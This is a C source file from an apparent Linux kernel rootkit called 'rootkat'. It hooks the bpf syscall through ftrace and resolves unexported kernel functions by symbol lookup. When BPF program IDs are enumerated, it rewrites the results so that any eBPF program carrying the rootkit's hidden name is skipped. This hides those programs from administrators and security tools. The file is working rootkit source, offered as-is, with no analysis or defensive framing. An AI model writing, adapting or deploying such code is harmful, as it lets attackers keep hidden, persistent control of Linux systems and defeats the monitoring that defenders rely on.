// SPDX-License-Identifier: MIT
#include <linux/bpf.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h>
#include "ftrace_hook.h"
#include "kallsyms.h"
#include "hook_sys_bpf.h"

#define TAG "rootkat/hook_sys_bpf: "

/* These functions exist in kallsyms but aren't exported, so we resolve
 * them at install time and call through function pointers. */
static struct bpf_prog *(*bpf_prog_by_id_p)(u32 id);
static void (*bpf_prog_put_p)(struct bpf_prog *prog);

static const char * const sys_bpf_candidates[] = {
	"__x64_sys_bpf", NULL,
};

typedef long (*sys_bpf_t)(const struct pt_regs *regs);

static long rootkat_sys_bpf(const struct pt_regs *regs);

static struct rootkat_hook hook_sys_bpf = {
	.candidates  = sys_bpf_candidates,
	.replacement = rootkat_sys_bpf,
};

/*
 * Look up a BPF prog by ID and check whether its name matches our
 * hidden-prog identifier. Caller must hold no special locks; this
 * function takes a refcount on the prog and drops it before returning.
 */
static bool prog_id_is_hidden(u32 id)
{
	struct bpf_prog *prog;
	bool hidden = false;

	if (!bpf_prog_by_id_p || !bpf_prog_put_p)
		return false;

	prog = bpf_prog_by_id_p(id);
	if (IS_ERR_OR_NULL(prog))
		return false;

	if (strncmp(prog->aux->name, ROOTKAT_HIDDEN_BPF_NAME,
	            sizeof(ROOTKAT_HIDDEN_BPF_NAME) - 1) == 0)
		hidden = true;

	bpf_prog_put_p(prog);
	return hidden;
}

/*
 * Replacement for __x64_sys_bpf. Calls the original first; if the cmd
 * is BPF_PROG_GET_NEXT_ID and the returned next_id belongs to one of
 * our hidden progs, advances start_id past it and re-issues the syscall
 * until the kernel returns a non-hidden ID (or runs out of progs).
 */
static long rootkat_sys_bpf(const struct pt_regs *regs)
{
	sys_bpf_t orig = (sys_bpf_t)hook_sys_bpf.original;
	int cmd = (int)regs->di;
	long ret;
	int max_iter = 1024;   /* safety: bound the recursion */

	ret = orig(regs);

	if (ret < 0 || cmd != BPF_PROG_GET_NEXT_ID)
		return ret;

	{
		union bpf_attr attr;
		void __user *uattr = (void __user *)regs->si;
		u32 size = (u32)regs->dx;

		if (size > sizeof(attr))
			size = sizeof(attr);

		while (max_iter-- > 0) {
			if (copy_from_user(&attr, uattr, size))
				break;
			if (!prog_id_is_hidden(attr.next_id))
				break;
			attr.start_id = attr.next_id;
			if (copy_to_user(uattr, &attr, size))
				break;
			ret = orig(regs);
			if (ret < 0)
				break;
		}
	}

	return ret;
}

int rootkat_hook_sys_bpf_install(void)
{
	bpf_prog_by_id_p = (void *)rootkat_lookup_name("bpf_prog_by_id");
	bpf_prog_put_p   = (void *)rootkat_lookup_name("bpf_prog_put");
	if (!bpf_prog_by_id_p || !bpf_prog_put_p) {
		pr_debug(TAG "bpf_prog_by_id/put unavailable; hide-by-name disabled\n");
		return -ENOENT;
	}
	return rootkat_hook_install(&hook_sys_bpf);
}

void rootkat_hook_sys_bpf_remove(void)
{
	rootkat_hook_remove(&hook_sys_bpf);
}
